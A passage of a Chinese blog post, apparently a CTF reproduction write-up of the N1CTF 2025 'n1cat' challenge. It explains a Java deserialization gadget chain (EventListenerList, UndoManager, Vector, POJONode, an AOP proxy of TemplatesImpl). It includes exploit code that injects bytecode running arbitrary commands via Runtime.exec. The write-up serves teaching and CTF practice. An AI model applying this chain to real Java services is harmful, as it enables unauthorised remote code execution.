class="hljs-comment">//生成要执行的命令的字节码</span><br>    <span class="hljs-type">byte</span>[] code2 = ClassPool._getDefault_().makeClass(_randomString_(<span class="hljs-number">6</span>)).toBytecode();<br><br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    _setFieldValue_(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);<span class="hljs-comment">//反射设置私有字段</span><br>    _setFieldValue_(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code1, code2&#125;);<span class="hljs-comment">//注入恶意字节码</span><br>    _setFieldValue_(templates, <span class="hljs-string">&quot;_transletIndex&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">//指定执行第一个字节码（code1）</span><br><br>    <span class="hljs-comment">//构建链条</span><br>    <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(_makeTemplatesImplAopProxy_(templates));<br>    <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">ell</span> <span class="hljs-operator">=</span> _getEventListenerList_(node);<br>    _serialize_(ell, <span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">return</span> ell;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplateCode(String cmd) <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool._getDefault_();<br>    <span class="hljs-type">CtClass</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> pool.makeClass(_randomString_(<span class="hljs-number">6</span>));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;\&quot;);&quot;</span>;<br>    template.makeClassInitializer().insertBefore(block);<span class="hljs-comment">//类初始化时执行命令</span><br>    <span class="hljs-keyword">return</span> template.toBytecode();<span class="hljs-comment">//生成字节码</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>使用的 gadget 如下</p>
+<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs leaf">EventListenerList<span class="hljs-punctuation">#</span><span class="hljs-keyword">readObject</span><span class="hljs-params">()</span><br> └── UndoManager<span class="hljs-punctuation">#</span><span class="hljs-keyword">toString</span><span class="hljs-params">()</span><br>     └── Vector<span class="hljs-punctuation">#</span><span class="hljs-keyword">toString</span><span class="hljs-params">()</span><br>         └── POJONode<span class="hljs-punctuation">#</span><span class="hljs-keyword">toString</span><span class="hljs-params">()</span><br>             └── Proxy(TemplatesImpl)<br></code></pre></td></tr></table></figure>
+
+<p>先看 EventListenerList#readObject()，要利用该入口需要其可成为 EventListener 类型，且实现了 Serializable 接口</p>
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/PoE5bPuIco0bEKxWTNSc0dM7nod.png" srcset="/img/loading.gif" lazyload></p>
+<p>如下图所示，UndoManager 实现了 UndoableEditListener，UndoableEditListener 继承了 EventListener 接口，因此可被 EventListenerList 接受，同时它继承了 CompoundEdit，再继承 AbstractUndoableEdit，最后实现了 Serializable 接口，从而可以被序列化与反序列化，完美符合利用条件。</p>
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/LbrxbewbKo3XrcxM330cXczynwh.png" srcset="/img/loading.gif" lazyload></p>
+<p>而后进入 <code>add(tmp, l)</code>，这里需要判断 <code>l</code> 对象是否是 <code>tmp</code> 的类型。这里 poc 中传入的是 <code>Class.class</code>，与 UndoManager 的类型不符，目的是为了进入报错从而隐式调用 <code>l</code> 即 UndoManager 的 toString 方法，所以只要不是 UndoManager.class 就行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> EventListenerList <span class="hljs-title function_">getEventListenerList</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>    <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>    <span class="hljs-type">Vector</span> <span class="hljs-variable">v</span> <span class="hljs-operator">=</span> (Vector) _getFieldValue_(undo, <span class="hljs-string">&quot;edits&quot;</span>);<br>    v.add(obj);<br><br>    _setFieldValue_(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Class.class, undo&#125;);<br>    <span class="hljs-keyword">return</span> list;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/Xfs6bGclloHjCvxaZCBcm4sQn4b.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看 UndoManager 的 toString 方法，limit 与 indexOfNextAdd 均为 int 类型没有利用价值</p>
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/ItVJbFopwoNTEQxml0Xc1xZanDg.png" srcset="/img/loading.gif" lazyload></p>
+<p>于是可以查看 super.toString()即 CompoundEdit.toString()，此处 edits 属性为 Vector 类的对象，字符串与对象拼接再次隐式触发 Vector 的 toString 方法</p>
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/CCQ2bJTXHoWaqRxY0L4cyWQ7nbd.png" srcset="/img/loading.gif" lazyload></p>
+<p>最终到达 AbstractCollection.toString()，此处获取一个当前集合的迭代器，而后遍历该 Vector 中存储的对象</p>
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/QNpVbGABpoEo3oxbTKgcvPQ5n7c.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/PflhbLUXSofrswxN4tZc6v8ZnOb.png" srcset="/img/loading.gif" lazyload></p>
+<p>此处在 poc 中传入的对象即 POJONode</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">......<br><span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(_makeTemplatesImplAopProxy_(templates));<br><span class="hljs-type">EventListenerList</span> <span class="hljs-variable">ell</span> <span class="hljs-operator">=</span> _getEventListenerList_(node);<br>......<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> EventListenerList <span class="hljs-title function_">getEventListenerList</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>    <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>    <span class="hljs-type">Vector</span> <span class="hljs-variable">v</span> <span class="hljs-operator">=</span> (Vector) _getFieldValue_(undo, <span class="hljs-string">&quot;edits&quot;</span>);<br>    v.add(obj);<br><br>    _setFieldValue_(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Class.class, undo&#125;);<br>    <span class="hljs-keyword">return</span> list;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过 Vector.add 方法将 POJONode 对象添加进去</p>
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/Ghsab8cnjomUPYx8KqUcAtZinYb.png" srcset="/img/loading.gif" lazyload></p>
+<p>再跟进 AbstractCollection.toString()中 StringBuilder.append()的操作</p>
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/BokyboNzgo10nzx4N7QcRdxAn5c.png" srcset="/img/loading.gif" lazyload></p>
+<p>进入 String.valueOf(obj)，最终实现任意 toString 方法调用</p>
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/LtRZbPOumouPMLxxUo2c89eynX7.png" srcset="/img/loading.gif" lazyload></p>
+<p>调用到 POJONode.toString 后任意调用 Getter，通过 AOP 代理增加调用稳定性，最终调用 TemplatesImpl.getOutputProperties 方法加载字节码实现 RCE</p>
+<p>关于 AOP 的部分可以参考 <a target="_blank" rel="noopener" href="https://research.qianxin.com/archives/2414">JDBC Attack 与高版本 JDK 下的 JNDI Bypass</a></p>
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/Xc1ebjaRYoYIghxCs90cVHeOnpf.png" srcset="/img/loading.gif" lazyload></p>
+<p>关于 TemplatesImpl 的部分可以参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/seizer/p/17064102.html">TemplatesImpl 利用链分析</a></p>
+<p>本文其他参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2025/08/21/%E9%AB%98%E7%89%88%E6%9C%ACjdk%E4%B8%8B%E7%9A%84spring%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">高版本 JDK 下的 Spring 原生反序列化链</a></li>
+<li><a target="_blank" rel="noopener" href="https://infernity.top/2025/03/24/EventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/#">EventListenerList 触发任意 toString</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15612">高版本 JDK 加载字节码分析</a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+        <a href="/tags/WriteUp/" class="print-no-link">#WriteUp</a>
+      
+        <a href="/tags/java/" class="print-no-link">#java</a>
+      
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#反序列化</a>
+      
+        <a href="/tags/%E7%BB%95%E8%BF%87/" class="print-no-link">#绕过</a>
+      
+        <a href="/tags/%E9%AB%98%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/" class="print-no-link">#高版本利用</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>N1CTF 2025 n1cat 复现</div>
+      <div>http://5i1encee.top/2026/01/05/N1CTF 2025 n1cat复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>5i1encee</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年1月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/01/05/CC%E9%93%BE%EF%BC%88%E4%B8%80%EF%BC%89/" title="CC 链（一）">
+                        <span class="hidden-mobile">CC 链（一）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"sYa0TwEtqgwqBctM2qchGbMG-gzGzoHsz","appKey":"Et6unsKpmF1YFlS3U5IE9nlB","path":"window.location.pathname","placeholder":"请友好交流哦~ ☆:.٩(๑❛ᴗ❛๑)۶°*☆","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://sya0twet.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <footer class="mt-4"> <font size="2" face="Georgia"> <div class="text-center py-3"> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/mouse_move.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
